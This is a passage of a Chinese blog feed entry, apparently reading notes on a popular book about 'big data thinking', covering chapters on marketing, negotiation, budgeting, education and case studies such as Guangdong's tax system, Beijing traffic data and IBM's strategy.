&lt;li&gt;再举个例子：我们得到了一个人的短信和通话数据、他微博的内容数据、医保和社保的数据，还有城市交通数据、签到数据、社交关系数据等。通过这些数据，我们就能对这个人形成深刻的认识，从而为其打造出完全个性化的服务。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;百度大数据关于技术方面的事例
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;百度大数据开放平台&lt;/li&gt;
&lt;li&gt;百度工业革命&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4056943&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4056943&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.3&lt;/span&gt; 生产思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;人类的行为是否可以被预测？&lt;/li&gt;
&lt;li&gt;如何运用“私人定制”思维？&lt;/li&gt;
&lt;li&gt;大数据“定制化”需得具备几个条件：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，要有海量的数据；&lt;/li&gt;
&lt;li&gt;其次，这些数据能够挖掘出对生产商家有价值的信息；&lt;/li&gt;
&lt;li&gt;再次，具备挖掘这样的数据的技术能力；&lt;/li&gt;
&lt;li&gt;最后，要有能力整合生产、流通和销售这些关键环节。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2e83291&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2e83291&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.4&lt;/span&gt; 自动化思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;关于信息安全，大数据作出的最大贡献就是通过自动化分析处理与深度挖掘，将亡羊补牢式的处理，转向还没有发生前的自动化评估预测和应急措施。&lt;/li&gt;
&lt;li&gt;大数据解析航空安防和自动化
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，从目前来说，飞机是地球上最安全的旅行交通工具，比其他交通工具，如汽车、火车等安全级别高很多。&lt;/li&gt;
&lt;li&gt;其次，飞机发生事故所造成的社会影响比其他交通工具发生事故造成的社会影响更大。&lt;/li&gt;
&lt;li&gt;再次，国外的一些专家经过研究得出了一个结论，那就是：国际航班比国内航班出事故的概率要低一些。其实并非如此，所有国家的航班出现事故的概率都相差无几，并不是发达国家的国际航班就更安全一些。&lt;/li&gt;
&lt;li&gt;最后，飞行过程中的安全概率是根据起飞和爬升到巡航高度，以及下降和着陆来决定的。当然了，这也是飞行中最容易出问题的地方。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org71588dc&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org71588dc&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.5&lt;/span&gt; 导向思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;新生的婴儿在第一时间就得学会哭泣；上学时，坐进教室的第一时间就得知道上什么课，拿什么书；进入高中后，必须规划今后的人生，上什么学、学什么专业、找什么样的姑娘或嫁什么样的男人，从事什么工作……这些，都需要一个导向思维，如果仅仅靠得过且过，明天的事明天说，犹如行尸走肉一般，一生将无建树。当然，绝大多数的人们，不会甘于现状，苛求发展，即使没有真正发展，也在内心存在这样的渴望，并独自努力。&lt;/li&gt;
&lt;li&gt;有了导向思维后，一切才会有规律地发展和进步，无论成功与否，其占据的位置都是其他特长所无法替代的。就好比当下就很火爆的阿里巴巴集团旗下的淘宝、天猫等，如果不是因马云的导向思维，怎么会有今天的互联网地位？&lt;/li&gt;
&lt;li&gt;马云的故事
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;“作为一个创业者，首先要给自己一个梦想。1995年我偶然有一次机会到了美国，然后我看见了、发现了互联网。我对技术几乎不懂，到目前为止，我对电脑的认识还是部分停留在收发邮件和浏览页面上。但是这并不重要，重要的是你到底有什么梦想。”&lt;/li&gt;
&lt;li&gt;在创业前，马云已经不缺钱了，至少是不缺吃饭的钱。在那个年代，马云是一名外语教师，还开了一间翻译社，又做夜校老师，有多个渠道的收入来源。用今天的话来说，马云已经脱离了蚁族和蜗居的时代，完全是不愁吃喝的公务员的待遇。但是，有了如此安逸闲适的生活之后，马云为何还要出来创业呢？因为，他想要的并不是这些，而是梦想，一个伟大的梦想。&lt;/li&gt;
&lt;li&gt;每个人都会说，我想要环球世界，我想要改变世界，我要让每一个人知道我的存在，为我的成功喝彩。可今天一过，继续过着朝九晚五的生活，在论坛或好友群吐槽工作的不易、上司不懂慧眼识英雄，闲时睡大觉、打游戏、三五好友瞎侃……如果你永远这样，那么你的导向思维没有起到任何作用，而仅仅是一个想法。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;IBM大数据战略导向认知计算
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;2014年3月，在IBM公司大数据新闻发布会上，IBM大中华区大数据和分析及新市场总经理，全球企业咨询服务部合伙人Jason Kelley宣布：“2014年，IBM大数据战略将持续升级在大数据方向的投入。IBM将继续深入在金融、电信、医疗、零售、制造等各行业的实践；并增强大数据与分析与云计算、移动、社交等热点趋势的融合，以及实现认知分析与大数据应用的不断融合。”&lt;/li&gt;
&lt;li&gt;IBM大中华区大数据中心总监王晓梅说：“在未来的大数据与分析实践中，IBM将进一步帮助企业把分析注入关键业务流程，从‘六大要务’角度解析业务需求，并导出对应的大数据与分析战略蓝图。当前，我们将重点推行该六大要务中对于客户洞察和流程革新的指导，帮助企业通过使用社交媒体分析等进行客户关系管理、市场营销决策，通过利用预测性维护、实时预警等进行财务等运营流程的优化。”&lt;/li&gt;
&lt;li&gt;从2005至今，IBM公司并购了35家以上的公司，比如，高速文件传输工具Aspera、IBM收购数据分析软件公司The Now Factory和备受关注的DaaS供应商Cloudant。综上所述，没有导向思维，就没有前进的动力和方向。没有大数据导向思维，就没有成功的可能性。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org12d5046&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org12d5046&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;7&lt;/span&gt; 大数据的营销策略&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-7&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd700918&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd700918&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.1&lt;/span&gt; 测量思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在进行大数据测试之前，首先要对测试需求做清晰的分析。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;举个例子：假设一个本科院校的学籍管理系统主要是用来管理学生的，学生在系统中的生命周期一般是四年。根据学校现有的在校生数和五年内的每一年的招生数据，就可以分析出需要构造的各个学年下的学生数。接着，对测试需求做准确清晰的分析后，对输入的测试数据进行分析。&lt;/li&gt;
&lt;li&gt;要求主要表现在两方面：一方面要求测试数据与生产环境数据一致。另一方面，就要求测试数据输入要满足输入限制规则，尽量覆盖到满足规则的不同类型的数据。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;问题探讨：到底是什么影响人们的幸福感呢？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;随着物质生活水平的提高，生活质量越来越得到人们的重视，而且，社会的总体心态与人们的行为准则有着密不可分的联系。一些社会指标告诉人们：最容易产生负面情绪的人群，不一定是生活最困难的人群，而是期望值与自身生活水平差距较大的人群。&lt;/li&gt;
&lt;li&gt;举个例子：关于幸福感的研究，学术界的大多人士都表明，幸福感是一种感觉，并不与财富的多少以及生活水平的高低成正比。社会心理学家曾列过这样的一个公式：期望实现值除以内心的期望值才等于人的情绪指数。期望实现值与内心期望值的比值一旦大于或等于1时，人就会处于一种兴奋的状态，就会感到满足；相反，如果期望实现值与内心期望值的比值小于1时，人就会感到压抑，“唉”声连连，甚至做出一些平时不做的极端事。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgda541c2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgda541c2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.2&lt;/span&gt; 谈判思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;所谓谈判，说的就是彼此之间，为了实现某种目的而进行的一种意见交换，然后寻找到一个制衡点，寻求问题解决的途径并达成协议的过程。&lt;/li&gt;
&lt;li&gt;在商业谈判中，我们绝对不能忽略数据对谈判结果产生的影响。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;打个比方说，数据就好比是一棵大树的枝叶，而想要与另一棵大树做比较的时候，除了其主干因素外，这些枝叶就是最为明显的可比部分。也就是说，掌控足够多的数据，将在谈判过程中掌控先机。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;如何利用数据在谈判中获得优势呢？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;掌控绝对的数据&lt;/li&gt;
&lt;li&gt;还要有针对性&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;不利用数据，仅仅依靠过去经验和谈判员的弊端
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;对产品认识不足的情况很容易出现在谈判桌上，从而导致在谈判中失去主导地位。而且，由于这种产品知识比较抽象，将之比喻为对产品以及产品所在行业的市场直觉更为合适。而直觉又往往是很难通过言语表达出来的，这就使得我们很难组织出一套权威的术语来说服对方，所以，就很难赢得对方的认可。&lt;/li&gt;
&lt;li&gt;更为重要的一点是，要想形成产品知识，还和销售人员有着至关重要的关系。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgccda64b&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgccda64b&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.3&lt;/span&gt; 预算思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在这个时代，财务所面对的数据规模将会越来越大，数据类型也将越来越复杂。那么，如何整理与统计这些杂乱无章的数据，让这些数据能够更直观明了地展现在人们面前，并且为企业管理者的经营决策提供有效的科学依据，则成为现阶段我们必然考虑的问题之一。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;对此问题，业内人士表示，全面预算管理将是让企业大数据“活起来”的最好方式。首先，预算是根据历年的数据和某些调整信息，对未来时期进行分析评测，进而得出的信息。其次，它是由实际业务数据和预算数据相结合与比较之后，而设计出来的一套最佳管理方案。利用这套方案，可以让企业资源得到更充分的利用，从而在未来获得更大的利益回报。&lt;/li&gt;
&lt;li&gt;笼统地说，全面预算管理解决方案是在对企业内外部大数据进行收集、处理、控制、分析、整合等的基础上，与其他工具结合，帮助企业更好地利用数据实现战略落地。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc7bf37f&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc7bf37f&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;7.4&lt;/span&gt; 选定思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-7-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;你了解你的客户吗？你能分清你的客户群体中哪些是可以长久合作、哪些只是暂时短期的利益相互关系吗？你的营销和广告投入应该针对哪类客户群体，你都清楚吗？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;企业想要做到正确的定位客户，首先就必须先设定目标。&lt;/li&gt;
&lt;li&gt;找到有价值的客户并不代表着就一定能够进行合作。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;“建立品牌”&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org805da29&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org805da29&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;8&lt;/span&gt; 教育、教学正在大数据化&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-8&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3e00e05&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3e00e05&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.1&lt;/span&gt; 院校思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据”时代，如何推动和创新院校教育模式
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;区别：传统数据的整理方式能凸显学生整体的专业水平或整体素质、身体的发育状况、社会性情绪及适应性的发展，还有对学校的满意程度等。而大数据就不一样了，它具备的分析能力更广、更细腻。它可以去关注每一个学生的微观表现，比如，在考试时，他在一道题上逗留了多久；在不同学科课堂上，他开小差的次数是多少；在食堂吃饭，他喜欢吃什么，不喜欢吃什么；每个学生的出生日期，包括喜欢的颜色等。&lt;/li&gt;
&lt;li&gt;这些数据对其他个体没有意义，但所有学生的数据整合起来对大数据分析就有价值了。比如旷课、纪律或课堂表现等预测模式，教育者就可以确认哪些学生退学的可能性较高。通过利用大数据来观察并分析对学生在课堂中点滴的表现，大数据帮助我们可以了解学生对知识的掌握程度以及感兴趣程度，进而让学校反思自己的教学模式是不是满足了学生的需求。有了大数据以后，教育工作者们就可以针对不同的学生进行不同的教育模式，从而真正做到因材施教和以人为本。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;传统的院校决策模式总结为四种：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一种是通过“合意”的过程来平衡大学内多方群体利益的“学院型”模式；&lt;/li&gt;
&lt;li&gt;第二种是通过“扩散”程序表达不同权力集团、利益群体诉求的“政治型”模式；&lt;/li&gt;
&lt;li&gt;第三种是决策程序无章可循、随意性大的“有组织无政府型”模式；&lt;/li&gt;
&lt;li&gt;第四种是依靠决策者所具有的理性认知能力制定决策的“官僚主义”模式。&lt;/li&gt;
&lt;li&gt;这四种模式的共同弱点在于缺少有力的决策支持依据，管理者实际上是以“有限理性”为基础，努力做出“足够好”的决策。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;在大数据背景下的院校决策，可以为教育决策者提供和完善认知经验所缺乏的信息、知识和智慧。针对这样的情况，有学者将其称为以数据系统为支撑的“知会理性”决策模式。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org497039c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org497039c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.2&lt;/span&gt; 教学思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据变革教育的第一波浪潮
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;翻转课堂是未来教育的课堂模式。采取让学生在上课前先学习教学视频，在课堂上完成作业或做实验的方式，而老师则在学生遇到学习困难时给予帮助，对他们进行一对一的个性化指导。&lt;/li&gt;
&lt;li&gt;MOOC风暴来袭，放大翻转课堂效应。&lt;/li&gt;
&lt;li&gt;微课程兴起：回应翻转课堂和MOOC浪潮。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd6ee001&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgd6ee001&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;8.3&lt;/span&gt; 教育思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-8-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;“大数据时代”以不可挡的势头扑面而来，给教育界的人敲响了警钟，告诉他们：“原始”的教育方式已经成为过去，“新时代”已经袭来。&lt;/li&gt;
&lt;li&gt;“大数据”并不是一种技术的时尚潮流，而是在信息技术高度发展之后，人们如何开发利用数据为新的商业模式发展奠定基础的过程。与此同时，也是一种基于新工具解决问题的全新思路。&lt;/li&gt;
&lt;li&gt;“大数据”怎么样改变传统的教育？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面是改变教育研究中对数据价值的认识；&lt;/li&gt;
&lt;li&gt;第二个方面是方便校长、教师更全面了解每一个学生；&lt;/li&gt;
&lt;li&gt;第三个方面是帮助学生进行个性化高效学习。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>杨倩</name></author><category term="Big-Data" /><category term="大数据" /><summary type="html">致胜大数据时代的50种思维方法 If you have questions, please send email to zrg1390556487@gmail.com. 1 前言 1.1 什么是大数据 最早提出“大数据”时代来临的是全球知名的咨询公司麦肯锡。“数据已经渗透到每一个行业和业务领域，成为重要的组成部分之一。人们对于海量数据的挖掘和运用，预示着新一波生产率增长和消费者盈余浪潮的到来。” 2008年9月，《自然》杂志推出了封面专栏——“大数据”，内容讲述了数据在生物、物理、工程、数学及社会经济等多方面学科所占据的位置和角色的重要性。 哈佛大学-社会学教授-加里·金说：“这是一场革命，庞大的数据资源使得各个领域开始了量化进程。无论学术界、商界还是政府，所有领域都将开始这种进程。” “大数据”，英文为&quot;Big Dat，，&quot;简单来说，“大数据”是一种巨量资料库，可以在合理时间内达到撷取、管理、处理并整理为帮助公司、企业经营和决策的资讯信息。 业界将“大数据”概括成四个V，即大量化(Volume)、多样化(Variety)、快速化(Velocity)和价值化(Value)。 大数据的信息量有多大？ 截止到2012年，数据量已经从TB级别跃升到PB、EB乃至ZB级别。（1024GB=1TB，1024TB=1PB，102**B=1EB，1024EB=1ZB）。 2008年，全球产生的数据量为0.49ZB；2009年的数据量为0.8ZB；2010年的数据量为1.2ZB；2011年的数据量更是持续增长，竟高达1.82ZB。这个数据量，相当于全世界的每个人产生200GB以上的数据。 IBM公司称，截止到2013年10月，全世界所获得的数据中，有90%都是过去两年内产生的。预计到2020年时，全世界所产生的数据规模将达到今天的44倍。 “大数据”不仅是量大而已，它还具有多样化、快速化、价值化等优势。 截止到2012年10月，大数据所形成的市场规模在51亿美元左右。到了2017年，此数据预计会上涨到530亿美元。 1.2 改变思维模式，用数据说话 来举一个简单的例子：苹果公司创始人史蒂夫·乔布斯在罹患癌症后，不惜花费巨额抽取了全身的DNA信息。这样一来，医生就可以根据他全身的DNA信息来判断癌细胞的变化，从而对症下药。然而，对于普通的患者来说，是拿不出巨额钱款来做这种抽取检测的。换句话说，医生只能从普通患者身上提取很小的一部分DNA信息。两者的治疗效果有多大差异，可想而知。 再来举个简单的例子：如果你上淘宝，登录支付宝账户，点开电子对账单，你是不是能够看到自己一年的消费曲线图？是不是能够看到每个月的支出和收入？是不是能够看到自己的钱花到哪里去了？是不是比拿笔记账清晰和准确得多？根据网络购物的数据中，你还会发现：哪个城市的男人比女人购买的东西还要多；哪个城市的人用支付宝缴纳水电费的频率最高；什么星座的男性或女性在某年的消费额最高；在一年里，在父母或亲友身上花费了多少；节假日时，什么东西最畅销…… 大数据专家维克托·迈尔-舍恩伯格在《大数据时代》中是这样解释的：云计算在获取海量数据的同时，也带来了数据的混杂性，这会给传统的数据分析带来一些困扰。在以往，我们习惯于由数据得出具体结果。而在大数据时代，我们应当关注的是数据之间的相关关系，而不是数据之间的因果关系。 数据之间的相关关系可以帮助我们捕捉现在的线索和预测未来。如A和B的情况经常一起发生，那么只要注意到B情况发生，就能预测A的情况是怎么样的。这种“A和B”的关系在零售行业和IT行业中已被广泛运用。7-11便利店通过分析零售终端的数据，得出了这样的一个相关关系—温度低于15摄氏度，暖宝宝的销售量便增加5%。于是，只要温度低于这一度数，7-11便利店内的暖宝宝就会上架；豆瓣电台会推荐一些你可能会喜欢的音乐；当你在当当网买某本书后，系统就会提醒你—购买这本书的人中，有30%也购买了另外一本书…… 2 大数据是一场革命 2.1 定律思维 此前，在大数据中，有两个较为突出的定律：一秒定律或秒级定律和摩尔定律。 什么叫一秒定律或秒级定律？指的是对处理速度有要求，一般要在秒级时间给出准确的分析结果。 什么叫摩尔定律？ 指的是简单地评估出半导体技术进展的经验法则，其重要的意义是对于长期来说的，IC制程技术是以一直线的方式向前推展，使得IC产品能持续降低成本，增加功能和提升性能。 大数据时代，人们更要重视统计学。为什么要强调统计学呢？那是因为人们在认知能力中，统计思维算是最差劲的。要知道，人的大脑中有一些功能比较优良，甚至超过人们自身的想象，比如人们的语言能力。 举个例子：当一个人在深夜行走时，会敏锐地察觉到周边的变化。一旦感受到危险或不安的情绪时，就会立即逃跑，甚至大喊大叫。而与此同时，人的大脑之中还有另外一套操作系统，是用来做逻辑推理以及进行统计分析的，只是这个系统不怎么完善。于是，人们天生就缺乏逻辑推理能力和统计思维能力。 为什么大数据变成了一个最热门的词汇？主要的原因有两个。 第一个原因是，由于IT革命后，人们有了处理数据的多方面能力，有对计算机数据的处理能力、对计算机的存储能力以及对计算机的计算的能力，等等。再加上，人类储存信息量的增长速度要比世界经济增长的速度快四倍（这仅仅是在金融危机爆发之前的世界经济增长的速度）。而计算机数据处理能力的增长速度，要比世界经济增长的速度快九倍。 第二个原因是，社会上的一切现象以及企业的发展，能够被数据化的东西越来越多。 社科院世界经济与政治研究所副所长何帆总结出了大数据的三个规律： 第一个规律是知其然而不必知其所以然，外行打败内行； 第二个规律是彻底的价格歧视，商家比你更了解你自己； 第三个规律是打破专家的信息优势，病人给医生解惑。 2.2 集合思维 如果把毫不相干或紧密相连的数据组合到一个集合中，就能更有效地处理这些相关的数据。这些数据可以清晰地告诉我们：每一个客户的消费观念、倾向、爱好、需求等，哪些可以归为一类，哪些可以归为另一类。 大数据的集合是数据数量上的增加，能够实现从量变到质变的过程。 大数据的基本结构还分为三个层次，反映出观察数据库的不同角度。 第一层是物理数据层：是数据库最里面的一层，是物理存贮设备上实际存储的数据的集合。这些数据是最原始数据，也是供用户加工的对象。物理数据层由内部模式描述的指令操作处理的位串、字符和字组合而成。 第二层是概念数据层：是数据库置于中间的一层，也是数据库的整体逻辑的部分。这层数据层指出了数据与数据之间的逻辑定义和联系，是存贮资料的整合点。此时要注意的是，这层数据层所涉及的是数据库所有对象的逻辑关系，而不是其物理情况。 第三层是逻辑数据层：是体验用户能够看到和使用的数据库，也是能够证明用户使用过的证明和踪迹。 总之，小数据，大集合就是按照某种数据集中起来并存放二级存储器中的一种方式。这种数据集合还有着一定的特点，比如尽量不出现重复的情况。 2.3 创新思维 首先，大数据的创新思维可以推动并实现巨大的经济效益。 其次，大数据的创新思维可以增强社会管理水平。 最后，大数据所具备的创新思维还可以推动和提高安全保障能力。 2.4 转型思维 以广东省地税系统为例子，从几大方面来揭示大数据推动公共管理从传统向现代转型的趋势。 第一个方面就是：从粗放化向精细化转型。通过建立省级数据应用大集中征管信息系统，广东地税摆脱了以往人工操作的粗放型管理模式，真正实现了税款自动入库、自动划解和实时监控，实现了税款的稳定增长以及快速增长。再通过对海量信息的详细分析和研究，广东省对每一个商家或是企业都实现了精细化转型。比如说，在房地产方面，由于建筑行业的人员流动性大，操作的环节复杂，且没有规范性，就形成了一个比较难管的问题。但自从有了这个征管系统以后，大数据就能够实时获取房地产开发项目明细信息，其中包括土地使用权信息、房产销售进度、销售明细建筑工程进度以及各阶段的税款缴纳情况等，实现了项目从产生到消亡的全过程监控。 第二个方面就是：从单兵作战型向协作共享型转型。在以往，不同政府部门拥有着不同的信息系统，但很多数据由于相互独立，所以彼此之间没有共享的信息，这些信息单独拿出去，就没有了任何用处。而大数据应用的出现，就扫除了这个盲点，使其实现了数据信息的共享，从而最大限度地发挥了数据的功效。如今，工商、税务等系统每天都会进行信息实时交换，推动了地税机关在办证服务上的创新，从原来的限时办证，实现了目前的即时办证；从原来填写一百多项登记信息，实现了目前只填写八项必要信息内容，甚至实现了享受免填服务。不仅如此，广东省地税借助大数据平台，积极推进第三方涉税信息共享，还明确了二十多个部门共享信息，真正做到了为每个部门提供便利，为社会经济的发展也提供了更快捷、更便利的服务。 第三个方面就是：从柜台式向自助式全天候转型。根据纳税人的不同类别、涉税业务的不同、办理时段不同等信息，广东地税借助大数据平台，形成了自助式全天候的一种转型。比如，增添了很多服务格局—网上办税、纳税热线、服务大厅、短信服务、自助办税等多种渠道并存的大服务格局。通过自助办税终端系统，为纳税人节时省力，不仅不受地方区域的限制，也可以不受时间的限制，自行完成代开小额发票、打印缴款凭证、清缴税费、申报缴纳车船税等业务。 第四个方面就是：从被动响应型向主动预见型转型。为了能够更好地服务纳税人，广东省地税通过税收大数据平台，还推出了一项特别的服务，那就是全省集中统一的短信服务。这项服务会为六百多万的纳税人提供短信订阅服务，有针对性地对目标群体提供了多项短信服务，如逾期未申报短信提醒、未到期未申报短信提醒，还有发票开具短信提醒等。借助于大数据平台，广东省地税实现了对受众精确式的短信服务，避免了轰炸式、盲目性的短信服务，从而提升了服务质量。据统计称：截止到2011年，短信服务量超过1800万条；到了2012年，短信服务量已经超过5000万条。 第五个方面就是：从纸质文书向电子政务转型。现如今，广东省地税互联网电子税务局已基本建成，纳税人只需要短短的五分钟，就能轻松办税，而且还实现了网上缴纳，足不出户。此外，广东省还率先推行网络开具发票，一方面为纳税人提供了方便，节省了时间。一方面使税务机关能在第一时间掌握每张发票的信息，与企业纳税申报数据比对分析，及时总结出没有缴纳、少缴纳的税款情况。这一行动推广以后，还意外地打击了假发票泛滥的情况，也避免了一些人用假发票报销的现象。也因此，这一措施被国家税务总局誉为“税收管理史上的颠覆性举措”。 第六个方面就是：从风险隐蔽型向风险防范型转型。依托大数据平台，广东省地税建立了惩防体系信息管理系统，对地税干部的税收执法和行政管理实行了全程分析和监控，有效监督和杜绝了一些知法犯法和影响国家荣誉的风险出现。监控预警信息从最初每月收到近7000个，到2012年每月收到不足500个，下降了92%。可以说，自从大数据监控平台出现后，全系统违法违纪发案率大幅度降低，不足5‰，也没有什么重大的违纪案件出现，这就是最大的成功！ 2.5 战略思维 未来，大数据相关的技术和能力将成为一个国家至关重要的核心战略资源。 2012年3月，美国总统***政府宣布推出一项发展计划——“大数据的研究和发展计划”。 2013年2月，法国政府发布了一项关于《数字化路线图》的技术措施，列出了五项将会大力支持的战略性高新技术，“大数据”位列其中。在这项措施中，法国政府将以软件制造商、工程师、新兴企业、信息系统设计师等为目标，开展一系列投资计划，旨在通过创新型和科学性的解决方案，将大数据运用到实际生活中。 2012年9月，日本总务省也发布了一项行动计划，提出“通过大数据和开放数据开创新市场”，以复苏日本为目的推进“活跃在ICT领域的日本”ICT综合战。 大数据的价值主要体现在三个方面。 第一个方面，是能够实现巨大的商业价值。 第二个方面是能够增强社会管理水平。 第三个方面是能够提高安全保障能力。 3 应对传统模式的大数据思维 3.1 扩散思维 为了更好地分析大数据之间的关联性和扩散性，Facebook使用了HBase。HBase是Apache（世界使用排名第一的Web服务器软件）的另外一款产品，使用了独特定义的一组表格。HBase可以像Hadoop（一个分布式系统基础架构，由Apache基金会所开发）一样执行大数据处理产品的能力，以更迅速、更精细的方式来分析数据之间的连接。 以北京的交通为例子。北京有一个交通智能化分析平台，其数据通过分析源自路网摄像头、传感器、轨道交通、旅游、地面公交、出租车、客运等行业方方面面的数据，得出了这样的一个结果：高速ETC数据每天50万条；4万辆的浮动车每天会产生近2000万条记录；出租车运营为数据为每天100万条；交通卡刷卡的记录为每天1900万条；手机定位数据为每天1800万条……此外，还计算出了北京的人均上班平均用时为52分钟，全国平均人均上班用时39分钟。这些海量的数据，在体量和产生速度上都对存储和处理能力提出了非常高的要求。 3.2 颠覆思维 在大数据时代，创新和转变思维就意味着进步，意味着发展。而传统的、守旧的思维已经不适用于这个时代。因此，转变思维是大数据时代的必然趋势。 移动说，搞了这么多年，今年才发现，腾讯才是我们的竞争对手。一个小小的微信软件运用，给了电话和短信致命性的一击！ 国内最大的免费安全平台360互联网安全中心能够颠覆传统杀毒软件市场，成为No.1。 诸多残酷的现实告诉我们：如果还停留在过去，不懂得转变，那只能被大数据时代淘汰！ 3.3 量变思维 